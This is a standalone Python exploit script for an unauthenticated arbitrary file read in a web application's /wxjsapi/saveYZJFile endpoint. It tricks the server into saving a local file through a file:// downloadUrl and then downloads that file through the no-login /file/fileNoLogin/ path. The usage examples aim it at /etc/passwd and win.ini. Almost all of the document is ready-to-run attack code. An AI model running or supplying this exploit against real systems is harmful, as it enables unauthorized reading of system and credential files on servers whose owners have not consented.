# coding=utf-8
__Author__="p4ssw0rd"
import requests
import json
import sys
import urllib3
urllib3.disable_warnings()
FILE="file:///etc/passwd"
url = "http://127.0.0.1:8080"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:79.0) Gecko/20100101 Firefox/79.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.6,en-US;q=0.4,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://web.chal.csaw.io:5000/", "Content-Type": "multipart/form-data; boundary=---------------------------18402212225729720772143832734", "Origin": "http://web.chal.csaw.io:5000", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
def getFile(url,FILE):
    while url[-1]=="/":
        url = url[:-1]
    url1=url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://%s&fileExt=txt" % (FILE)

    json_output = requests.get(url1, verify=False,headers=headers,).content
    # json_output='''
    # {"isencrypt":0,"filepath":"\/usr\/ebridge\/file\/202009\/RL\/840706e0496e48138dd69aef4bee8a29.txt","updatetime":"2020-09-12","isdelete":0,"download":0,"iszip":0,"contenttype":"","extension":"txt","id":"adac6ef60b46496fba4ebebd3d3bc3b8","createtime":"2020-09-12","updaterid":"0","filesize":1944,"creatorid":"0","name":"840706e0496e48138dd69aef4bee8a29.txt","enctype":0}
    # '''
    try:
        if "id" in json_output:
            id = json.loads(json_output)["id"]
            url2 = url+"/file/fileNoLogin/%s" % id
            fileOutput =requests.get(url2, verify=False,headers=headers,).content

            return (fileOutput)
        else:
            return ("No vuln Or No this file.")
    except ValueError as e:
        return ("Detect waf.")
    

    

if __name__ == "__main__":
    if len(sys.argv)<3:
        print("usage: python3 %s url FILE" % __file__)
        print("example: python3 %s http://127.0.0.1/ /etc/passwd" %__file__)
        print("example: python3 %s http://127.0.0.1/ c:/windows/win.ini" %__file__)
    else:
        url = sys.argv[1]
        FILE= sys.argv[2]    
        print(getFile(url,FILE))